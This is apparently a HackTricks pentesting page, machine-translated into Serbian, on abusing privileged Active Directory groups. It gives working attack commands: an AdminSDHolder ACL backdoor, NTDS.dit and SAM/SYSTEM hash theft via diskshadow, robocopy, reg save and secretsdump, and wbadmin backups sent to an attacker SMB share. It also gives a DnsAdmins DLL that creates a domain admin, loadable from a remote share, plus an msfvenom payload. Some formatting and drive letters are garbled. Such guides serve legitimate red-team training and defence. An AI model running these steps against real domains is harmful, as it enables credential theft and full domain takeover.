# Privileged Groups

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Pažljivo poznate grupe sa administratorskim privilegijama

* **Administratori**
* **Domen Administratori**
* **Preduzeće Administratori**

## Operatori naloga

Ova grupa ima ovlašćenje da kreira naloge i grupe koje nisu administratori na domenu. Pored toga, omogućava lokalno prijavljivanje na Kontroler domena (DC).

Da bi se identifikovali članovi ove grupe, izvršava se sledeća komanda:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Dodavanje novih korisnika je dozvoljeno, kao i lokalna prijava na DC01.

## AdminSDHolder grupa

Access Control List (ACL) grupe **AdminSDHolder** je ključna jer postavlja dozvole za sve "zaštićene grupe" unutar Active Directory-a, uključujući grupe sa visokim privilegijama. Ovaj mehanizam osigurava bezbednost ovih grupa sprečavanjem neovlašćenih izmena.

Napadač bi mogao da iskoristi ovo tako što bi izmenio ACL grupe **AdminSDHolder**, dodeljujući pune dozvole standardnom korisniku. Ovo bi efikasno dalo tom korisniku punu kontrolu nad svim zaštićenim grupama. Ako se dozvole ovog korisnika izmenjuju ili uklanjaju, one bi se automatski ponovo uspostavile u roku od sat vremena zbog dizajna sistema.

Komande za pregled članova i izmenu dozvola uključuju:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
A script is available to expedite the restoration process: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

For more details, visit [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Članstvo u ovoj grupi omogućava čitanje obrisanih objekata Active Directory-a, što može otkriti osetljive informacije:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Pristup Kontroleru Domena

Pristup datotekama na DC-u je ograničen osim ako korisnik nije deo grupe `Server Operators`, što menja nivo pristupa.

### Eskalacija Privilegija

Korišćenjem `PsService` ili `sc` iz Sysinternals, može se pregledati i modifikovati dozvole servisa. Grupa `Server Operators`, na primer, ima potpunu kontrolu nad određenim servisima, što omogućava izvršavanje proizvoljnih komandi i eskalaciju privilegija:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Ova komanda otkriva da `Server Operators` imaju potpuni pristup, omogućavajući manipulaciju servisima za povišene privilegije.

## Backup Operators

Članstvo u grupi `Backup Operators` pruža pristup `DC01` fajl sistemu zbog privilegija `SeBackup` i `SeRestore`. Ove privilegije omogućavaju pretragu foldera, listanje i kopiranje fajlova, čak i bez eksplicitnih dozvola, koristeći `FILE_FLAG_BACKUP_SEMANTICS` flag. Korišćenje specifičnih skripti je neophodno za ovaj proces.

Da biste naveli članove grupe, izvršite:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Lokalni Napad

Da bi se iskoristile ove privilegije lokalno, koriste se sledeći koraci:

1. Uvezi potrebne biblioteke:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Omogućite i verifikujte `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Pristupite i kopirajte datoteke iz ograničenih direktorijuma, na primer:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Direktan pristup datotečnom sistemu kontrolera domena omogućava krađu `NTDS.dit` baze podataka, koja sadrži sve NTLM hešove za korisnike i računare u domenu.

#### Using diskshadow.exe

1. Kreirajte senku kopiju `C` diska:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopirajte `NTDS.dit` iz senčne kopije:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativno, koristite `robocopy` za kopiranje fajlova:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Izvucite `SYSTEM` i `SAM` za preuzimanje hešova:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Preuzmite sve hash-e iz `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Using wbadmin.exe

1. Postavite NTFS datotečni sistem za SMB server na mašini napadača i keširajte SMB akreditive na cilјnoj mašini.
2. Koristite `wbadmin.exe` za sistemsku rezervnu kopiju i ekstrakciju `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Za praktičnu demonstraciju, pogledajte [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Članovi **DnsAdmins** grupe mogu iskoristiti svoje privilegije da učitaju proizvoljni DLL sa SYSTEM privilegijama na DNS serveru, koji se često hostuje na kontrolerima domena. Ova sposobnost omogućava značajan potencijal za eksploataciju.

Da biste prikazali članove DnsAdmins grupe, koristite:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Izvrši proizvoljni DLL

Članovi mogu naterati DNS server da učita proizvoljni DLL (bilo lokalno ili sa udaljenog dela) koristeći komande kao što su:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Ponovno pokretanje DNS usluge (što može zahtevati dodatne dozvole) je neophodno da bi se DLL učitao:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
For more details on this attack vector, refer to ired.team.

#### Mimilib.dll
Takođe je moguće koristiti mimilib.dll za izvršavanje komandi, modifikujući ga da izvršava specifične komande ili reverzne shelove. [Pogledajte ovaj post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) za više informacija.

### WPAD Record for MitM
DnsAdmins mogu manipulisati DNS zapisima da bi izveli napade Man-in-the-Middle (MitM) kreiranjem WPAD zapisa nakon onemogućavanja globalne liste blokiranih upita. Alati poput Responder ili Inveigh mogu se koristiti za lažiranje i hvatanje mrežnog saobraćaja.

### Event Log Readers
Članovi mogu pristupiti dnevnicima događaja, potencijalno pronalazeći osetljive informacije kao što su lozinke u običnom tekstu ili detalji izvršenja komandi:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions
Ova grupa može da menja DACL-ove na objektu domena, potencijalno dodeljujući DCSync privilegije. Tehnike za eskalaciju privilegija koje koriste ovu grupu su detaljno opisane u Exchange-AD-Privesc GitHub repozitorijumu.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administratori
Hyper-V Administratori imaju potpuni pristup Hyper-V, što se može iskoristiti za preuzimanje kontrole nad virtuelizovanim domen kontrolerima. Ovo uključuje kloniranje aktivnih DC-ova i vađenje NTLM hash-eva iz NTDS.dit datoteke.

### Primer Iskorišćavanja
Mozilla Maintenance Service u Firefox-u može biti iskorišćen od strane Hyper-V Administratora za izvršavanje komandi kao SYSTEM. Ovo uključuje kreiranje tvrdog linka do zaštićene SYSTEM datoteke i zamenu sa zlonamernim izvršnim fajlom:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Note: Eksploatacija hard linkova je ublažena u nedavnim Windows ažuriranjima.

## Organizacija Upravljanje

U okruženjima gde je **Microsoft Exchange** implementiran, posebna grupa poznata kao **Organizacija Upravljanje** ima značajne mogućnosti. Ova grupa ima privilegiju da **pristupa poštanskim sandučićima svih korisnika domena** i održava **potpunu kontrolu nad 'Microsoft Exchange Bezbednosnim Grupama'** Organizacione Jedinice (OU). Ova kontrola uključuje **`Exchange Windows Permissions`** grupu, koja se može iskoristiti za eskalaciju privilegija.

### Eksploatacija Privilegija i Komande

#### Operateri Štampe
Članovi grupe **Operateri Štampe** imaju nekoliko privilegija, uključujući **`SeLoadDriverPrivilege`**, koja im omogućava da **se lokalno prijave na Kontroler Domena**, isključe ga i upravljaju štampačima. Da bi iskoristili ove privilegije, posebno ako **`SeLoadDriverPrivilege`** nije vidljiv u neuzdignutom kontekstu, potrebno je zaobići Kontrolu Korisničkog Naloga (UAC).

Da biste naveli članove ove grupe, koristi se sledeća PowerShell komanda:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Za detaljnije tehnike eksploatacije vezane za **`SeLoadDriverPrivilege`**, treba konsultovati specifične bezbednosne resurse.

#### Korisnici daljinske radne površine
Članovima ove grupe je odobren pristup računarima putem Protokola daljinske radne površine (RDP). Da bi se izbrojali ovi članovi, dostupne su PowerShell komande:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Dalje informacije o eksploataciji RDP-a mogu se naći u posvećenim pentesting resursima.

#### Korisnici za daljinsko upravljanje
Članovi mogu pristupiti računarima putem **Windows Remote Management (WinRM)**. Enumeracija ovih članova se postiže kroz:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Za tehnike eksploatacije povezane sa **WinRM**, treba konsultovati specifičnu dokumentaciju.

#### Server Operators
Ova grupa ima dozvole za izvođenje raznih konfiguracija na kontrolerima domena, uključujući privilegije za pravljenje rezervnih kopija i vraćanje, promenu sistemskog vremena i isključivanje sistema. Da biste nabrojali članove, komanda koja se koristi je:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## References <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podrška HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
